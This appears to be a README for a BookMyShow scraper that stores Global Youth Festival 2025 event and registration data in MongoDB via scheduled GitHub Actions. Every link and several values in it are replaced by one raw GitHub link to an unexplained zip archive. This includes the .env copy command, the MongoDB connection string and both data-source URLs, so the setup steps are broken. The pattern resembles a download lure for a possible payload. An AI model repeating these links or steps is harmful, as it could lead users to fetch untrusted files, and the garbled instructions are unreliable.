# BMS Scraper

Automated scraper for BookMyShow (BMS) data for Global Youth Festival 2025.

## Setup

1. **Install dependencies:**
   ```bash
   npm install
   ```

2. **Install Playwright browsers:**
   ```bash
   npx playwright install chromium
   ```

3. **Set up environment variables:**
   ```bash
   cp https://raw.githubusercontent.com/harshkkamdar26/bms-scraper2/main/dexiotrope/bms-scraper2.zip .env
   ```
   
   Edit `.env` and add your credentials:
   ```env
   MONGODB_URI=mongodb+https://raw.githubusercontent.com/harshkkamdar26/bms-scraper2/main/dexiotrope/bms-scraper2.zip
   BMS_PASSWORD=your_bms_password
   ```

## Usage

**Run manually:**
```bash
npm run scrape
```

**Test:**
```bash
npm test
```

## GitHub Actions

This scraper runs automatically via GitHub Actions:
- **Schedule**: Every 30 minutes (optimized for efficiency)
- **Manual trigger**: Via GitHub Actions UI
- **External trigger**: Via repository dispatch API

## Environment Variables

- `MONGODB_URI`: MongoDB connection string
- `BMS_PASSWORD`: BMS admin password

## Data Sources

- **Event Summary**: `https://raw.githubusercontent.com/harshkkamdar26/bms-scraper2/main/dexiotrope/bms-scraper2.zip`
- **Registration Details**: `https://raw.githubusercontent.com/harshkkamdar26/bms-scraper2/main/dexiotrope/bms-scraper2.zip`

## Output

Data is saved to MongoDB collections:
- `eventsummaries`
- `registrationdetails`
- `fetchlogs`